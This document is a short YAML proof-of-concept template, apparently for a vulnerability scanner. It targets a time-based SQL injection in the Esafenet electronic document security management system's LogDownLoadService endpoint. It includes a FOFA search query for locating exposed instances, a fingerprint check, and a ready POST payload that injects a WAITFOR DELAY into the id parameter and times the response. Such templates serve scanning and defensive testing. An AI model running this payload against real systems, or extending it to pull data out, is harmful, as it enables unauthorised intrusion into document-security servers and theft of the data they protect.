id: poc-yaml-yisaitong-esafenet-logdownloadservice-sqli
info:
  name: 亿赛通电子文档安全管理系统 LogDownLoadService SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 亿赛通电子文档安全管理系统
  fofa: app="亿赛通-电子文档安全管理系统"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"CDGServer3")
- method: POST
  path: /CDGServer3/logManagement/LogDownLoadService
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: command=downLoadLogFiles&currPage=1&fromurl=../user/dataSearch.jsp&logFileName=indsex.txt&id=-1';WAITFOR
    DELAY '0:0:{{.t1}}'--
  expression: status_code == 200 && contains(body,"icon:") && contains(body,"id:")
    && !contains(body,"<") && duration > t1 && duration < t2
transport: http
